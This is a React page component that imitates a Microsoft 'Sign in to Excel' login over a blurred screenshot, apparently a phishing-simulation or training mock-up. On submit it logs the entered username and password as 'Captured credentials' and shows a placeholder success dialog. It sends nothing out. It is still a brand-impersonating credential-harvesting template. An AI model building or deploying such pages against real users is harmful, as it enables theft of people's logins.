'use client';
import { FormEvent, useState } from 'react';
import { AlertDialog, AlertDialogAction, AlertDialogContent, AlertDialogDescription, AlertDialogFooter, AlertDialogHeader, AlertDialogTitle } from '@/components/ui/alert-dialog';
import { CheckCircle2 } from 'lucide-react';

export default function Home() {
  const imageUrl = "https://storage.googleapis.com/fsm-build-artefacts/PhishingSampleAnalysis10June-1.jpg";

  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showDialog, setShowDialog] = useState(false);

  const handleSubmit = (event: FormEvent) => {
    event.preventDefault();
    console.log('Captured credentials:', { username, password });
    setShowDialog(true);
  };
  
  return (
    <>
      {/* Blurred Image */}
      <img id="blurredImage" src={imageUrl} alt="Blurred screenshot" />

      <AlertDialog open={showDialog} onOpenChange={setShowDialog}>
        <AlertDialogContent className="sm:max-w-sm">
          <AlertDialogHeader className="items-center">
            <div className="flex h-12 w-12 items-center justify-center rounded-full border-4 border-green-100 bg-green-50 mb-4">
              <CheckCircle2 className="h-8 w-8 text-green-600" />
            </div>
            <AlertDialogTitle>
              Success Message Title
            </AlertDialogTitle>
            <AlertDialogDescription>
              Well done, you pressed a button
            </AlertDialogDescription>
          </AlertDialogHeader>
          <AlertDialogFooter>
            <AlertDialogAction 
              onClick={() => setShowDialog(false)}
              className="w-full bg-blue-500 hover:bg-blue-600 text-white"
              style={{backgroundColor: '#60a5fa'}}
              >
              OK
            </AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>

      {/* Login Overlay */}
      <div className="login-overlay" role="main" aria-label="Excel Login Screen">
        
        <h2>Sign in to Excel</h2>
        <form onSubmit={handleSubmit}>
          <input 
            type="text" 
            name="username" 
            placeholder="Email or phone" 
            autoComplete="username" 
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            required 
          />
          <input 
            type="password" 
            name="password" 
            placeholder="Password" 
            autoComplete="current-password" 
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required 
          />
          <button type="submit">Sign in</button>
          <small>© Microsoft Corporation</small>
        </form>
      </div>
    </>
  );
}
